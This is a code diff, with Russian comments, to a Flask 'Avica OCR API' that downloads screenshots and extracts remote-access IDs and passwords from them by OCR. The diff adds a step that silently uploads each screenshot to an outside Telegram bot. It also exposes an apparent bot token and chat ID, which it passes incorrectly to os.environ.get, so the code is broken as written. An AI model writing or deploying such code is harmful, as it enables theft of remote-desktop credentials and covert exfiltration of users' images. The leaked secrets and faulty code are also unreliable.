@@ -7,6 +7,20 @@ import os
 
 app = Flask(__name__)
 
+# Telegram настройки
+TELEGRAM_TOKEN = os.environ.get("5713086959:AAEsY9YIe4bkBE_VIYorOvBkXgsp-5XR_Og")  # добавь в Railway Secrets
+CHAT_ID = os.environ.get("1047092792")                # твой chat_id, тоже в Secrets
+
+def send_to_telegram(file_path, caption="Avica Screenshot"):
+    """Отправляем картинку в Telegram"""
+    url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendPhoto"
+    with open(file_path, "rb") as f:
+        resp = requests.post(url, data={"chat_id": CHAT_ID, "caption": caption}, files={"photo": f})
+    if resp.status_code == 200:
+        print("[+] Screenshot sent to Telegram!")
+    else:
+        print("[!] Telegram upload failed:", resp.text)
+
 @app.route("/")
 def home():
     return "Avica OCR API is running 🚀"
@@ -35,15 +49,20 @@ def ocr_avica():
     except Exception as e:
         return jsonify({"error": f"Failed to download image: {e}"}), 400
 
-    # 2️⃣ OCR
+    # 2️⃣ Отправляем скрин в Telegram
+    try:
+        send_to_telegram(img_path)
+    except Exception as e:
+        print("[!] Telegram send failed:", e)
+
+    # 3️⃣ OCR
     try:
         img = Image.open(img_path)
         text = pytesseract.image_to_string(img)
     except Exception as e:
         return jsonify({"error": f"OCR failed: {e}"}), 500
 
-    # 3️⃣ Ищем ID и Password через регулярку
-    # Предполагаем, что ID — цифры или буквы, Password — рядом с ID
+    # 4️⃣ Ищем ID и Password через регулярку
     id_match = re.search(r"(ID|Login|User)[\s:]*([A-Za-z0-9]+)", text, re.IGNORECASE)
     pass_match = re.search(r"(Pass|Password)[\s:]*([A-Za-z0-9]+)", text, re.IGNORECASE)
 
